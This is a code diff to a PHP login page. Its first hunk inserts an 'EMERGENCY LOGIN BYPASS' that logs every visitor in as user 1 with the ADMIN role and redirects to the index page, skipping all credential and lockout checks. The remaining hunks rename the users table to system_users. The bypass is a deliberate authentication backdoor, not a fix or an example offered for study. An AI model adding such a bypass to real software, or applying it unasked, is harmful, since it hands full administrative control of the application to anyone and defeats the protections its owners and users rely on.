@@ -4,6 +4,14 @@ require '../src/Security.php';
 require '../src/Logger.php';
 session_start();
 
+session_start();
+// --- EMERGENCY LOGIN BYPASS ---
+$_SESSION['user_id'] = 1;
+$_SESSION['username'] = 'admin';
+$_SESSION['role'] = 'ADMIN';
+header("Location: index.php");
+exit;
+
 $alertType = '';
 $alertMsg = '';
 $lockoutSeconds = 0;
@@ -82,7 +90,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
             exit;
         } else {
             // Normal Login Logic
-            $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+            $stmt = $pdo->prepare("SELECT * FROM system_users WHERE username = ?");
             $stmt->execute([$username]);
             $user = $stmt->fetch();
 
@@ -104,7 +112,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
 
                 // [SECURITY] Reset failed attempts on success
                 try {
-                    $pdo->prepare("UPDATE users SET failed_attempts = 0, locked_until = NULL WHERE id = ?")->execute([$user['id']]);
+                    $pdo->prepare("UPDATE system_users SET failed_attempts = 0, locked_until = NULL WHERE id = ?")->execute([$user['id']]);
                 } catch (PDOException $e) {
                     // Ignore if column missing (allows Admin to login and fix DB)
                 }
